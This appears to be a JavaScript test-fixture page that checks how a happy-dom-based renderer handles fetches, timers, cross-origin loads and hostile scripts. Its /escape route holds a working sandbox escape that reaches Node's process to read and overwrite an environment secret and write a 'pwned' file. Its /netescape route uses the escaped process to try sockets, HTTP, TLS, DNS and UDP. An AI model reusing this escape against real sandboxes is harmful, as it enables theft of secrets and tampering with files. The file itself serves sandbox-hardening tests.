const root = document.getElementById("root");
const show = (html) => {
  root.innerHTML = `<main>${html}</main>`;
};

function boom() {
  throw new Error("boom");
}

function start() {
  switch (location.pathname) {
    case "/":
      show('<h1>Home</h1><a href="/fetch">Fetch</a> <a href="/held">Held</a>');
      break;
    case "/fetch":
      fetch("/data.json")
        .then((r) => r.json())
        .then((d) => show(`<p>${d.text}</p>`));
      break;
    case "/held":
      window.__WFA_READY__ = false;
      setTimeout(() => {
        show("<h1>Held</h1>");
        window.__WFA_READY__ = true;
      }, 300);
      break;
    case "/forever":
      window.__WFA_READY__ = false;
      break;
    case "/boom":
      boom();
      break;
    case "/reject":
      fetch("/data.json").then(() => {
        throw new Error("async boom");
      });
      break;
    case "/console":
      console.timeStamp("t");
      console.profile("p");
      console.profileEnd("p");
      show("<h1>Console</h1>");
      break;
    case "/interval":
      setInterval(() => {}, 1000);
      show("<h1>Interval</h1>");
      break;
    case "/dynamic":
      import("./chunk.js").then((m) => m.render(root));
      break;
    case "/css": {
      // what Vite's preload helper does for a lazy chunk's CSS: append a stylesheet, then listen
      const link = document.createElement("link");
      link.rel = "stylesheet";
      link.crossOrigin = "";
      link.href = "/style.css";
      document.head.appendChild(link);
      link.addEventListener("load", () => show("<h1>Styled</h1>"));
      link.addEventListener("error", () => show("<h1>Unstyled</h1>"));
      break;
    }
    case "/empty":
      break;
    case "/xorigin": {
      // loads a script, stylesheet and image from the origin in ?from=, then renders regardless
      const from = new URLSearchParams(location.search).get("from");
      const script = document.createElement("script");
      script.async = true; // as browsers treat inserted scripts; happy-dom loads others synchronously
      script.src = from + "/evil.js";
      document.head.appendChild(script);
      const link = document.createElement("link");
      link.rel = "stylesheet";
      link.href = from + "/evil.css";
      document.head.appendChild(link);
      show(`<h1>Cross</h1><img src="${from}/evil.png" alt="">`);
      break;
    }
    case "/xfetch": {
      // the render survives a failed request it handles
      const from = new URLSearchParams(location.search).get("from");
      fetch(from + "/data.json").then(
        (r) => r.json().then((d) => show(`<p>xfetch ok ${d.text}</p>`)),
        (e) => show(`<p>xfetch failed ${e && e.name}</p>`),
      );
      break;
    }
    case "/xneeds": {
      // the render depends on the request
      const from = new URLSearchParams(location.search).get("from");
      fetch(from + "/data.json")
        .then((r) => r.json())
        .then((d) => show(`<p>${d.text}</p>`));
      break;
    }
    case "/escape": {
      // a hostile script: escapes happy-dom's VM to Node's process, reads secrets, writes a file
      const q = new URLSearchParams(location.search);
      let out;
      try {
        const p = window.constructor.constructor("return process")();
        out = { escaped: true, secret: p.env.WFA_TEST_SECRET ?? null, keys: Object.keys(p.env).sort() };
        p.env.WFA_TEST_SECRET = "overwritten";
        try {
          p.getBuiltinModule("fs").writeFileSync(q.get("write"), "pwned");
          out.wrote = true;
        } catch (e) {
          out.wrote = String(e && (e.code || e.name));
        }
      } catch (e) {
        out = { escaped: false, error: String(e && e.name) };
      }
      show(`<pre id="escape">${JSON.stringify(out)}</pre>`);
      break;
    }
    case "/netescape": {
      // a hostile script that escaped to Node tries to reach the network on its own
      const other = new URL(new URLSearchParams(location.search).get("other"));
      window.__WFA_READY__ = false;
      const p = window.constructor.constructor("return process")();
      const mod = (n) => p.getBuiltinModule(n);
      const outcome = (fn) =>
        new Promise((resolve) => {
          try {
            fn(resolve);
          } catch (e) {
            resolve(String(e && (e.code || e.name)));
          }
          setTimeout(() => resolve("timeout"), 2000);
        });
      const net = mod("net");
      const restoreAttempt = (() => {
        try {
          Object.defineProperty(net.Socket.prototype, "connect", { value: function () {} });
          return "restored";
        } catch (e) {
          return String(e && e.name);
        }
      })();
      Promise.all([
        outcome((done) => {
          const s = net.connect(Number(other.port), "127.0.0.1", () => done("connected"));
          s.on("error", (e) => done(String(e.code)));
        }),
        outcome((done) => {
          const s = new net.Socket();
          s.on("error", (e) => done(String(e.code)));
          s.connect({ port: Number(other.port), host: "127.0.0.1" }, () => done("connected"));
        }),
        outcome((done) => {
          mod("http").get(other.href + "via-http", () => done("responded")).on("error", (e) => done(String(e.code)));
        }),
        outcome((done) => {
          p.getBuiltinModule("tls").connect(443, "example.com", () => done("connected")).on("error", (e) => done(String(e.code)));
        }),
        outcome((done) => {
          mod("dns").lookup("example.com", (e) => done(e ? String(e.code) : "resolved"));
        }),
        outcome((done) => {
          mod("dns").promises.lookup("example.com").then(() => done("resolved"), (e) => done(String(e.code)));
        }),
        outcome((done) => {
          globalThis.constructor.constructor("return fetch")()(other.href + "via-fetch").then(() => done("fetched"), (e) => done(String(e.code || e.cause?.code || e.name)));
        }),
        outcome((done) => {
          mod("dgram").createSocket("udp4").send("x", Number(other.port), "127.0.0.1", (e) => done(e ? String(e.code) : "sent"));
        }),
      ]).then((results) => {
        show(`<pre id="escape">${JSON.stringify({ restoreAttempt, results })}</pre>`);
        window.__WFA_READY__ = true;
      });
      break;
    }
    case "/codegen": {
      // page-realm eval works anywhere; a function from happy-dom's own (Node) realm needs code generation
      const page = eval("1 + 1") + new Function("return 1")();
      const host = window.constructor.constructor("return 4")();
      show(`<p>codegen ${page + host}</p>`);
      break;
    }
    case "/syncscript": {
      // a classic script without async/defer: happy-dom loads it synchronously
      const script = document.createElement("script");
      script.src = "/classic.js";
      document.head.appendChild(script);
      break;
    }
    case "/syncxhr": {
      // a synchronous XHR the page survives (it falls back), and one it does not
      let text = "fallback";
      try {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", "/data.json", false);
        xhr.send();
        text = JSON.parse(xhr.responseText).text;
      } catch {
        // keep the fallback
      }
      show(`<p>syncxhr ${text}</p>`);
      break;
    }
    case "/syncxhr-needed": {
      const xhr = new XMLHttpRequest();
      xhr.open("GET", "/data.json", false);
      xhr.send();
      show(`<p>${JSON.parse(xhr.responseText).text}</p>`);
      break;
    }
    case "/xsocket": {
      const from = new URLSearchParams(location.search).get("from");
      let result = "opened";
      try {
        new WebSocket(from.replace(/^http/, "ws") + "/socket");
      } catch (e) {
        result = "refused " + e.name;
      }
      show(`<p>socket ${result}</p>`);
      break;
    }
  }
}

start();
